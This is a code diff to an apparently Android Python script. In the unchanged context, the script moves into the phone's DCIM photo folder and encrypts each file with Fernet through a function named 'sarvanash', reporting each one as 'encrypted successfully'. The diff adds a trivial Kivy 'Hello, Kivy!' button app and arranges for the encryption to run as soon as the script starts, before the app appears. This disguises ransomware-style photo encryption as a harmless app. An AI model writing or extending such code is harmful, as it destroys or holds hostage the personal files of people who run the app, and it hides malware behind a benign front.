@@ -1,5 +1,16 @@
 from cryptography.fernet import Fernet
 import os
+from kivy.app import App
+from kivy.uix.button import Button
+
+
+class MyApp(App):
+    def build(self):
+        return Button(text='Hello, Kivy!', on_press=self.on_button_press)
+
+    def on_button_press(self, instance):
+        print('Button pressed!')
+
 
 os.chdir("/storage/emulated/0/DCIM")
 # os.chdir("/root/Pictures")
@@ -40,6 +51,8 @@ def main():
         sarvanash(file, key)
         print(file + " encrypted successfully!")
 
+if __name__ == '__main__':
+    main()
+    MyApp().run()
 
-main()
 
